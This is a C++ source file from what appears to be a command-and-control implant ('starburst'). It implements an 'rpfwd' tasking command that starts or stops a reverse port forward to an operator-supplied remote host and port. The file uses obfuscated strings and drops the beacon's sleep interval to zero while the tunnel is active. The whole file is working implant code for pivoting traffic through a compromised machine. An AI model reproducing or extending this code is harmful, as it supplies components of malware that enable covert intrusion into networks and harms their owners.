#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>
#include <rpfwd.h>

#ifdef INCLUDE_CMD_RPFWD

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_rpfwd(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t action_len = 0;
    auto action = parser_string( params, &action_len );

    uint32_t host_len = 0;
    auto host = parser_string( params, &host_len );

    uint32_t port = parser_int32( params );

    if ( !action || action_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            XSTR( "missing action" ) );
        return;
    }

    xstr(start_str, "start");
    char stop_str[]  = { 's', 't', 'o', 'p', 0 };

    if ( str_ncmp( action, start_str, 5 ) == 0 ) {
        if ( inst.rpfwd_state ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                XSTR( "rpfwd already active" ) );
            return;
        }

        if ( !host || host_len == 0 || port == 0 ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                XSTR( "missing remote_ip or remote_port" ) );
            return;
        }

        char host_buf[256] = {};
        if ( host_len >= sizeof(host_buf) ) host_len = sizeof(host_buf) - 1;
        memory::copy( host_buf, host, host_len );
        host_buf[host_len] = 0;

        if ( !rpfwd_init( inst, host_buf, (uint16_t)port ) ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                XSTR( "rpfwd init failed" ) );
            return;
        }

        inst.agent.sleep_ms = 0;

        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            XSTR( "rpfwd started" ) );
    } else if ( str_ncmp( action, stop_str, 4 ) == 0 ) {
        if ( !inst.rpfwd_state ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                XSTR( "rpfwd not active" ) );
            return;
        }

        rpfwd_destroy( inst );

        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            XSTR( "rpfwd stopped" ) );
    } else {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            XSTR( "unknown action: use start or stop" ) );
    }
}

#endif
